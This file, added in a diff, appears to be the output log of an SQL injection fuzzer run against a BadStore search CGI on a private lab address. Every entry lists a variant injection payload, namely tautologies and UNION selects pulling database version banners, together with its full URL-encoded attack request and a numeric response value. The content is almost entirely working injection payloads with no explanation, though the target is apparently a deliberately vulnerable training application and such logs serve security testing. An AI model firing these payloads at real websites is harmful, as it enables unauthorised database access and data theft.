@@ -1,0 +1,401 @@
+s&&o1: select * from users where id='1' or ||/1=1 union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26%26o1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%7C%7C/1%3D1%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	500
+
+s&()o: select * from users where id='1' or (\)=1 union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26%28%29o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%28%5C%29%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+s&(.): select * from users where id='1' or (\.)=1 union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26%28.%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%28%5C.%29%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+s&(1): select * from users where id='1' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26%281%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%281%29%3D1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+s&.o&: select * from users where id='1' or \.<\ or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26.o%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C%5C%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	499
+
+s&.o1: select * from users where id='1' or \.<1 union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26.o1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C1%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&.oU: select * from users where id='1' or \.<\ union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26.oU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C%5C%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&.on: select * from users where id='1' or \.<$ union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26.on%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C%24%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&.oo: select * from users where id='1' or \.< =1 union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26.oo%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C%20%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&1UE: select * from users where id='1' ||1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%261UE%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%7C%7C1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+s&1c: select * from users where id='1'   or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%261c%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%20%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	490
+
+s&1oo: select * from users where id='1' or 1^=1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%261oo%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%201%5E%3D1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+s&n.o: select * from users where id='1' or $ .=1 union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26n.o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%20.%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+s&n1&: select * from users where id='1' or $ 1=1 or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26n1%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%201%3D1%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	497
+
+s&n1U: select * from users where id='1' or $ 1=1 union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26n1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%201%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+s&no&: select * from users where id='1' or $<\ or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26no%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%3C%5C%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	498
+
+s&no.: select * from users where id='1' or $<\. union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26no.%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%3C%5C.%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&noU: select * from users where id='1' or $<\ union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26noU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%3C%5C%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&noo: select * from users where id='1' or $+<$ union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26noo%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%2B%3C%24%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&o.&: select * from users where id='1' or \<\. or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26o.%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%5C.%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	499
+
+s&o.U: select * from users where id='1' or \<\. union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26o.U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%5C.%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&o1&: select * from users where id='1' or \<1 or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26o1%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C1%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	498
+
+s&o1U: select * from users where id='1' or !<1 union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26o1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%21%3C1%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+s&oUE: select * from users where id='1' or \<\ union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26oUE%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%5C%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&on&: select * from users where id='1' or \<$ or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26on%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%24%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	498
+
+s&onU: select * from users where id='1' or \<$ union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26onU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%24%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&oo1: select * from users where id='1' or \< =1 union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26oo1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%20%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	503
+
+s&ov&: select * from users where id='1' or !<@ or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26ov%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%21%3C%40%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	498
+
+s&ovU: select * from users where id='1' or !<@ union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26ovU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%21%3C%40%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+s&v(1: select * from users where id='1' or @(1)=1 union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26v%281%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%40%281%29%3D1%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	500
+
+s&v1U: select * from users where id='1' or @ 1=1 union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26v1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%40%201%3D1%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	500
+
+s&vvU: select * from users where id='1' or @ @1=1 union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%26vvU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%40%20%401%3D1%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	500
+
+s(UEs: select * from users where id=1 or 1#"( union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%28UEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%28%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+s,UEs: select * from users where id=1 or 1#", union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%2CUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%2C%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+s.UEs: select * from users where id=1 or 1#". union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s.UEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22.%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+s1UEs: select * from users where id=1 or 1#"1 union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s1UEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%221%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+s: select * from users where id='1' or ""<@ union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%22%22%3C%40%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	513
+
+s:UEs: select * from users where id=1 or 1#": union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%3AUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%3A%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+s:s: select * from users where id='1' union select ":"_,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%3As%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%22%3A%22_%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	510
+
+s;UEs: select * from users where id=1 or 1#"; union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%3BUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%3B%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+s;s: select * from users where id='1' union select ";"_,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%3Bs%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%22%3B%22_%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	510
+
+s?,vc: select * from users where id='1' union select $["],@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%3F%2Cvc%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%24%5B%22%5D%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	505
+
+s?UEs: select * from users where id=1 or 1#"? union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%3FUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%3F%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+s?s: select * from users where id='1' union select "?"_,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%3Fs%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%22%3F%22_%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	510
+
+sUE&o: select * from users where id='1' union select ||/1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE%26o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%7C%7C/1%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE(): select * from users where id='1' union select (\),@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE%28%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%28%5C%29%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE(.: select * from users where id='1' union select (\.),@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE%28.%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%28%5C.%29%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE(1: select * from users where id='1' union select (1),banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE%281%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%281%29%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE,v: select * from users where id='1' union select \,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE%2Cv%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE.,: select * from users where id='1' union select \.,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE.%2C%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C.%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE.c: select * from users where id='1' union select \.#,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE.c%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C.%23%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE.o: select * from users where id='1' union select \.%1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE.o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C.%251%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE1k: select * from users where id='1' union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE1k%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE1n: select * from users where id='1' union select 1a,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE1n%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%201a%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+sUE1s: select * from users where id='1' union select 1"!",banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE1s%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%201%22%21%22%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	510
+
+sUE\c: select * from users where id='1' union select \#,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUE%5Cc%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C%23%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUEn.: select * from users where id='1' union select $ .,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEn.%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%24%20.%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUEnn: select * from users where id='1' union select $ _,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEnn%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%24%20_%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUEnv: select * from users where id='1' union select $*$,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEnv%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%24%2A%24%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUEo,: select * from users where id='1' union select +\,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEo%2C%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%2B%5C%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUEo.: select * from users where id='1' union select +\.,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEo.%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%2B%5C.%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUEo1: select * from users where id='1' union select !<1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEo1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%21%3C1%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+sUEo\: select * from users where id='1' union select +\#,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEo%5C%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%2B%5C%23%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+sUEov: select * from users where id='1' union select !<@,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEov%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%21%3C%40%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+sUEv1: select * from users where id='1' union select @ 1,version() --  1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEv1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%40%201%2Cversion%28%29%20--%20%201%27&action=search&x=0&y=0
+	500
+
+sUEvk: select * from users where id='1'   union select null,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEvk%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%20%20union%20select%20null%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+sUEvv: select * from users where id='1' union select @ @1,version() --  1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sUEvv%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%40%20%401%2Cversion%28%29%20--%20%201%27&action=search&x=0&y=0
+	500
+
+sn: select * from users where id='1' union select "["_,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sn%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%22%5B%22_%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	510
+
+snUEs: select * from users where id=1 or 1#"$ union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=snUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%24%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+so()&: select * from users where id='1' *(\) or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so%28%29%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A%28%5C%29%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	493
+
+so()U: select * from users where id='1' + (\) union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so%28%29U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%28%5C%29%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+so(.): select * from users where id='1' + (\.) union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so%28.%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%28%5C.%29%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+so(1): select * from users where id='1' *(1) union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so%281%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A%281%29%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+so..&: select * from users where id='1'<@.. or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so..%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%3C%40..%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	495
+
+so..U: select * from users where id='1'<@.. union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so..U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%3C%40..%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+so.n&: select * from users where id='1' <@.$ or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so.n%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40.%24%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	496
+
+so.nU: select * from users where id='1' <@._ union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so.nU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40._%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+so1&1: select * from users where id='1' + 1||1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so1%261%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%201%7C%7C1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+so1UE: select * from users where id='1' *1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=so1UE%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+soc: select * from users where id='1' + @<@# union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=soc%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%3C%40%23%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+son.&: select * from users where id='1' *$ . or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=son.%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A%24%20.%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	493
+
+son.U: select * from users where id='1' + $ . union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=son.U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%24%20.%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+son1&: select * from users where id='1' *$ 1 or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=son1%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A%24%201%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	493
+
+sonn&: select * from users where id='1' <@$_ or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sonn%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%24_%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	496
+
+sonnU: select * from users where id='1' <@$_ union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sonnU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%24_%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+soo&1: select * from users where id='1' + $+%\ or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=soo%261%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%24%2B%25%5C%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	495
+
+soo1&: select * from users where id='1' <@&1 or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=soo1%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%261%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+soo1U: select * from users where id='1' <@&1 union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=soo1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%261%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	507
+
+sooUE: select * from users where id='1' <@<@ union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sooUE%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%3C%40%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	506
+
+soon&: select * from users where id='1' + $+%$ or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=soon%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%24%2B%25%24%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	495
+
+soonU: select * from users where id='1' + $+*$ union select 1,@@VERSION -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=soonU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%24%2B%2A%24%20union%20select%201%2C%40%40VERSION%20--%201%27&action=search&x=0&y=0
+	500
+
+soov&: select * from users where id='1' <@&@ or 1=1 -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=soov%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%26%40%20or%201%3D1%20--%201%27&action=search&x=0&y=0
+	500
+
+soovU: select * from users where id='1' %!<@ union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=soovU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%25%21%3C%40%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+sos: select * from users where id='1'<@$$ union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sos%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%3C%40%24%24%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	503
+
+sov(1: select * from users where id='1' + @(1) union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sov%281%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%281%29%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	500
+
